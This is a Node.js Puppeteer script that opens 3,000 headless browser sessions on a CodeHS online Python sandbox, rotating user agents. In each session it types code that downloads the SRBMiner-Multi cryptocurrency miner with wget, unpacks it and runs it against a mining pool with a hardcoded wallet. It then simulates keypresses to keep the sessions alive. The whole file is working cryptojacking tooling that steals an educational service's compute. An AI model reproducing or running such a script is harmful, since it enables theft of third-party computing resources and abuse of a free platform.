const userAgent = require('user-agents');
const puppeteer = require('puppeteer');
(async () => {
    for(i=0;i<3000;i++){
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox']
    });
    const page = await browser.newPage();
    await page.setUserAgent(userAgent.toString())
    await page.goto('https://codehs.com/sandbox/id/python-3-esyA5R')
    await page.waitForTimeout(2000)
    await page.mouse.click(350, 350, { 'button': 'left' })
    await page.waitForTimeout(1000)
    await page.keyboard.down('ControlLeft')
    await page.keyboard.press('KeyA')
    await page.keyboard.up('ControlLeft')
    await page.keyboard.type(`import os;import time;os.system("wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz");time.sleep(3);os.system("tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz");time.sleep(3);os.system("cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.ROOT${i} --password x")`)
    await page.waitForTimeout(5000)
    await page.mouse.click(580,125,{'button': 'left'})
    await page.waitForTimeout(1000)
    for(y=0;y<350;y++) {
        await page.mouse.click(580,400,{'button': 'left'})
        await page.keyboard.press('KeyH')
        await page.waitForTimeout(5000)
        await page.keyboard.press('KeyS')
        await page.waitForTimeout(5000)
        await page.keyboard.press('KeyH')
        await page.waitForTimeout(5000)
        console.log(`pimpo${i}${y}`)
    }
    await page.waitForTimeout(1000)
    await page.mouse.click(630,125,{'button': 'left'})
    await page.waitForTimeout(5000)
    await browser.close();
    }
})();
